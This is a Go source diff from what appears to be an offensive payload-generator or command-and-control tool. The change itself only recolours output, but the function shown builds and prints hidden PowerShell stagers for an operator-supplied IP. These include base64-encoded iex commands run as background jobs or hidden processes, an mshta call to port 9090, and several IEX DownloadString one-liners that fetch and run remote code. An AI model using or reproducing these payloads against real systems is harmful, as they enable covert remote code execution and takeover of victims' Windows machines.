@@ -309,6 +309,7 @@ func info_os() {
 func Hosts() {
 
 	Blue := color.New(color.FgBlue).SprintFunc() //颜色设定 https://github.com/fatih/color
+	red := color.New(color.FgRed).SprintFunc()
 
 	prompt := &survey.Input{
 		Message: "set ip",
@@ -328,15 +329,15 @@ func Hosts() {
 	encoded := base64.StdEncoding.EncodeToString(strbytes)
 	// fmt.Println(encoded)
 	command := "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))}"
-	fmt.Printf("%s %s \n", Blue("[+]"), command)
+	fmt.Printf("%s %s \n", red("[+]"), command)
 	fmt.Println("\n")
 
 	command = "Start-Process powershell -ArgumentList " + "\"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))\"" + " -WindowStyle Hidden"
-	fmt.Printf("%s %s \n", Blue("[+]"), command)
+	fmt.Printf("%s %s \n", red("[+]"), command)
 	fmt.Println("\n")
 
 	command = "mshta http://" + Host + ":9090/hjf"
-	fmt.Printf("%s %s \n", Blue("[+]"), command)
+	fmt.Printf("%s %s \n", red("[+]"), command)
 	fmt.Println("\n")
 
 	//---------------------------------------------------------------
@@ -348,12 +349,12 @@ func Hosts() {
 	commandJ := "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded_JOB + "')))}"
 	//commandF = commandJ
 	fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell JOB Payload+---")
-	fmt.Printf("%s %s \n", Blue("[+]"), commandJ)
+	fmt.Printf("%s %s \n", red("[+]"), commandJ)
 	fmt.Println("\n")
 	//---------------------------------------------------------------
 	commandP := "Start-Process powershell -ArgumentList " + "\"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))\"" + " -WindowStyle Hidden"
 	fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell New Process Payload+---")
-	fmt.Printf("%s %s \n", Blue("[+]"), commandP)
+	fmt.Printf("%s %s \n", red("[+]"), commandP)
 	fmt.Println("\n")
 	//---------------------------------------------------------------
 	commandF_IP := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/hjf');IEX($s)"
@@ -361,7 +362,7 @@ func Hosts() {
 	commandF_encoded := base64.StdEncoding.EncodeToString(commandF_strbytes)
 	commandF := "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + commandF_encoded + "')))"
 	fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell JOB + File Payload+---")
-	fmt.Printf("%s %s \n", Blue("[+]"), commandF)
+	fmt.Printf("%s %s \n", red("[+]"), commandF)
 	fmt.Println("\n")
 	//---------------------------------------------------------------
 	simple_payload := "powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');Invoke-Expression $h;\""
@@ -369,11 +370,11 @@ func Hosts() {
 	simple_payload2 := "powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');\""
 	simple_payload3 := "powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');\""
 	fmt.Printf("%s %s \n", Blue("[*]"), "---+ Powershell simple payloads +---")
-	fmt.Printf("%s %s \n", Blue("[+]"), simple_payload)
+	fmt.Printf("%s %s \n", red("[+]"), simple_payload)
 	fmt.Println("\n")
-	fmt.Printf("%s %s \n", Blue("[+]"), simple_payload2)
+	fmt.Printf("%s %s \n", red("[+]"), simple_payload2)
 	fmt.Println("\n")
-	fmt.Printf("%s %s \n", Blue("[+]"), simple_payload3)
+	fmt.Printf("%s %s \n", red("[+]"), simple_payload3)
 	fmt.Println("\n")
 }
 
